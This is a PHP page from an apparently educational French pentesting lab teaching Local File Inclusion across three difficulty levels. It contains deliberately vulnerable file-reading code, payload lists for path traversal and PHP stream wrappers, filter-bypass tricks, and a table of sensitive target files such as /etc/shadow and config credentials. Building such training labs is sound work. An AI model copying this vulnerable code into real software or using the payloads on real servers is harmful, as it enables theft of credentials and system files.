<?php
require_once __DIR__ . '/../../config/config.php';

$level = $_GET['level'] ?? '1';
$content = '';
$error = '';

if (isset($_GET['file']) || isset($_POST['file'])) {
    $file = $_GET['file'] ?? $_POST['file'] ?? '';

    if ($level == '1') {
        // ⚠️ NIVEAU 1 : LFI sans aucun filtre
        if (!empty($file)) {
            $path = __DIR__ . '/pages/' . $file;
            if (file_exists($path)) {
                $content = file_get_contents($path);
            } else {
                // Essai de lecture directe (path traversal)
                if (file_exists($file)) {
                    $content = file_get_contents($file);
                } else {
                    $error = "Fichier introuvable: $file";
                }
            }
        }

    } elseif ($level == '2') {
        // ⚠️ NIVEAU 2 : Filtre basique (bypassable)
        $file = str_replace('../', '', $file); // Filtre naïf - bypassable
        $path = __DIR__ . '/pages/' . $file;

        if (file_exists($path)) {
            $content = file_get_contents($path);
        } else {
            $error = "Fichier introuvable (après filtrage): $file";
        }

    } elseif ($level == '3') {
        // ⚠️ NIVEAU 3 : Wrapper PHP (php://input, php://filter)
        if (str_starts_with($file, 'php://') || str_starts_with($file, 'data://')) {
            $content = file_get_contents($file);
        } else {
            $path = __DIR__ . '/pages/' . basename($file);
            $content = file_exists($path) ? file_get_contents($path) : "Fichier: $file non trouvé";
        }
    }
}

// Créer les pages exemples si elles n'existent pas
$pages_dir = __DIR__ . '/pages/';
if (!is_dir($pages_dir)) mkdir($pages_dir, 0777, true);
file_put_contents($pages_dir . 'home.txt', "Bienvenue sur CyberLab !\nPage d'accueil du système.");
file_put_contents($pages_dir . 'about.txt', "CyberLab v1.0\nPlateforme de pentesting éducatif.\nCréé pour l'apprentissage de la cybersécurité.");
file_put_contents($pages_dir . 'secret.txt', "FLAG{lfi_secret_page_found_congrats}\nCette page contient des informations sensibles.\nAPI_KEY=lfi_secret_api_key_12345");
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LFI Lab — CyberLab</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/KaliTest/assets/css/style.css">
</head>
<body>
    <canvas id="matrix-canvas"></canvas>

    <nav class="navbar">
        <div class="nav-brand">
            <div class="brand-icon">⬡</div>
            <span class="brand-name">CYBER<span class="accent">LAB</span></span>
        </div>
        <div class="nav-status" style="margin-right:auto">
            <div class="status-dot"></div>
            <span class="status-text" id="nav-time"></span>
        </div>
        <div class="nav-links">
            <a href="/KaliTest/" class="nav-link">Accueil</a>
            <a href="/KaliTest/labs/" class="nav-link">Labs</a>
        </div>
    </nav>

    <div class="page-wrapper">
        <div class="page-header">
            <p class="page-breadcrumb"><a href="/KaliTest/">Accueil</a> / <a href="/KaliTest/labs/">Labs</a> / LFI</p>
            <h1 class="page-title">📂 LOCAL FILE INCLUSION LAB</h1>
            <p class="page-desc">Exploitez les failles d'inclusion de fichiers pour lire des fichiers sensibles sur le serveur via la traversée de répertoires (Path Traversal).</p>
        </div>

        <div style="display:flex; gap:.6rem; margin-bottom:2rem; flex-wrap:wrap">
            <a href="?level=1" class="lab-btn" style="<?= $level=='1'?'background:rgba(0,255,136,.2); border-color:var(--neon-green)':'' ?>">Niveau 1 — LFI Direct</a>
            <a href="?level=2" class="lab-btn" style="<?= $level=='2'?'background:rgba(0,255,136,.2); border-color:var(--neon-green)':'' ?>">Niveau 2 — Filtre ../</a>
            <a href="?level=3" class="lab-btn" style="<?= $level=='3'?'background:rgba(0,255,136,.2); border-color:var(--neon-green)':'' ?>">Niveau 3 — PHP Wrappers</a>
        </div>

        <div class="lab-content">
            <div>
                <div class="lab-panel" style="margin-bottom:1.5rem">
                    <div class="panel-header">
                        🎯 NIVEAU <?= $level ?> —
                        <?= $level=='1' ? 'LFI sans filtre' : ($level=='2' ? 'Filtre ../ simple' : 'PHP Stream Wrappers') ?>
                    </div>
                    <div class="panel-body">
                        <?php if ($level == '1'): ?>
                        <p style="font-size:.85rem; color:var(--neon-red); margin-bottom:1rem">
                            ⚠️ L'application inclut directement le fichier passé en paramètre :
                            <code style="color:var(--neon-yellow)">file_get_contents("pages/$file")</code>.
                            Utilisez <code>../</code> pour remonter dans l'arborescence !
                        </p>
                        <?php elseif ($level == '2'): ?>
                        <p style="font-size:.85rem; color:var(--neon-yellow); margin-bottom:1rem">
                            🔍 Le filtre <code>str_replace('../', '')</code> est appliqué. Bypass avec : <code>....//</code> ou <code>..././</code>
                        </p>
                        <?php else: ?>
                        <p style="font-size:.85rem; color:var(--neon-blue); margin-bottom:1rem">
                            🔍 Utilisez les wrappers PHP pour lire les fichiers en base64 :
                            <code>php://filter/convert.base64-encode/resource=index.php</code>
                        </p>
                        <?php endif; ?>

                        <form method="GET" action="?level=<?= $level ?>">
                            <input type="hidden" name="level" value="<?= $level ?>">
                            <div class="form-group">
                                <label class="form-label">FICHIER À CHARGER</label>
                                <input type="text" name="file" class="form-input"
                                       placeholder="home.txt"
                                       value="<?= htmlspecialchars($_GET['file'] ?? 'home.txt') ?>">
                                <p class="form-hint">
                                    <?php if ($level == '1'): ?>
                                    💡 Essayez: <code>../../../config/config.php</code> ou <code>secret.txt</code>
                                    <?php elseif ($level == '2'): ?>
                                    💡 Bypass: <code>....//....//config/config.php</code>
                                    <?php else: ?>
                                    💡 Wrapper: <code>php://filter/convert.base64-encode/resource=index.php</code>
                                    <?php endif; ?>
                                </p>
                            </div>
                            <button type="submit" class="btn-submit">📂 CHARGER</button>
                        </form>

                        <!-- Pages disponibles -->
                        <div style="margin-top:1rem; display:flex; gap:.5rem; flex-wrap:wrap">
                            <span style="font-family:var(--font-mono); font-size:.7rem; color:var(--text-secondary)">Pages disponibles:</span>
                            <a href="?level=<?= $level ?>&file=home.txt" class="hint-code" style="margin:0; display:inline">home.txt</a>
                            <a href="?level=<?= $level ?>&file=about.txt" class="hint-code" style="margin:0; display:inline">about.txt</a>
                            <a href="?level=<?= $level ?>&file=secret.txt" class="hint-code" style="margin:0; display:inline">secret.txt</a>
                        </div>

                        <?php if (!empty($error)): ?>
                        <div class="alert alert-danger" style="margin-top:1rem"><?= htmlspecialchars($error) ?></div>
                        <?php endif; ?>

                        <?php if (!empty($content)): ?>
                        <div class="result-box" style="margin-top:1rem">
                            <div class="result-header">📄 CONTENU DU FICHIER : <?= htmlspecialchars($_GET['file'] ?? '') ?></div>
                            <div class="result-body">
                                <pre style="font-family:var(--font-mono); font-size:.8rem; color:var(--neon-green); white-space:pre-wrap; word-break:break-all; max-height:400px; overflow-y:auto"><?= htmlspecialchars($content) ?></pre>
                            </div>
                        </div>
                        <?php if (str_contains($content, 'FLAG{')): ?>
                        <div class="flag-box">🚩 FLAG TROUVÉ !</div>
                        <?php endif; ?>
                        <?php endif; ?>
                    </div>
                </div>

                <!-- Windows Sensitive Files -->
                <div class="lab-panel">
                    <div class="panel-header">🗂️ FICHIERS SENSIBLES À CIBLER</div>
                    <div class="panel-body">
                        <table class="data-table">
                            <tr><th>OS</th><th>Fichier</th><th>Contenu</th></tr>
                            <tr><td>Linux</td><td><code style="color:var(--neon-green)">/etc/passwd</code></td><td>Utilisateurs système</td></tr>
                            <tr><td>Linux</td><td><code style="color:var(--neon-green)">/etc/shadow</code></td><td>Mots de passe hashés</td></tr>
                            <tr><td>Linux</td><td><code style="color:var(--neon-green)">/var/log/apache2/access.log</code></td><td>Log Poisoning possible</td></tr>
                            <tr><td>Windows</td><td><code style="color:var(--neon-green)">C:\Windows\System32\drivers\etc\hosts</code></td><td>Fichier hosts</td></tr>
                            <tr><td>Windows</td><td><code style="color:var(--neon-green)">C:\xampp\htdocs\config.php</code></td><td>Config DB</td></tr>
                            <tr><td>PHP</td><td><code style="color:var(--neon-green)">../config/config.php</code></td><td>Credentials DB</td></tr>
                        </table>
                    </div>
                </div>
            </div>

            <div class="hint-panel">
                <div class="hint-section">
                    <div class="panel-header">📖 GUIDE LFI</div>
                </div>
                <div class="hint-section">
                    <p class="hint-title">⚡ PAYLOADS LFI</p>
                    <?php if ($level == '1'): ?>
                    <code class="hint-code">secret.txt</code>
                    <code class="hint-code">../../../config/config.php</code>
                    <code class="hint-code">../../../../../../etc/passwd</code>
                    <code class="hint-code">C:\Windows\System32\drivers\etc\hosts</code>
                    <?php elseif ($level == '2'): ?>
                    <code class="hint-code">....//....//config/config.php</code>
                    <code class="hint-code">..././..././config/config.php</code>
                    <code class="hint-code">%2e%2e%2f%2e%2e%2fconfig/config.php</code>
                    <?php else: ?>
                    <code class="hint-code">php://filter/read=convert.base64-encode/resource=index.php</code>
                    <code class="hint-code">php://filter/read=string.rot13/resource=index.php</code>
                    <code class="hint-code">data://text/plain,&lt;?php phpinfo();?&gt;</code>
                    <?php endif; ?>
                </div>
                <div class="hint-section">
                    <p class="hint-title">📚 BYPASS TECHNIQUES</p>
                    <p class="hint-text" style="font-size:.75rem; line-height:1.8">
                        <strong style="color:var(--neon-yellow)">Double encoding:</strong> %252e%252e%252f<br>
                        <strong style="color:var(--neon-yellow)">Null byte:</strong> file.php%00<br>
                        <strong style="color:var(--neon-yellow)">Strip bypass:</strong> ....//..../<br>
                        <strong style="color:var(--neon-yellow)">URL encoding:</strong> %2e%2e%2f
                    </p>
                </div>
                <div class="hint-section">
                    <p class="hint-title">🛡️ DÉFENSES</p>
                    <p class="hint-text">
                        • Whitelisting des fichiers<br>
                        • realpath() + vérification du préfixe<br>
                        • Désactiver allow_url_include<br>
                        • Désactiver allow_url_fopen<br>
                        • Utiliser basename() avec prudence
                    </p>
                </div>
            </div>
        </div>
    </div>

    <script src="/KaliTest/assets/js/main.js"></script>
    <script>
        document.querySelectorAll('.hint-code[onclick]').forEach(code => {
            code.style.cursor = 'pointer';
        });
        document.querySelectorAll('.hint-code:not([href])').forEach(code => {
            code.addEventListener('click', () => {
                const input = document.querySelector('input[name="file"]');
                if (input) {
                    input.value = code.textContent.trim();
                    showToast('Payload copié !');
                }
            });
        });
    </script>
</body>
</html>
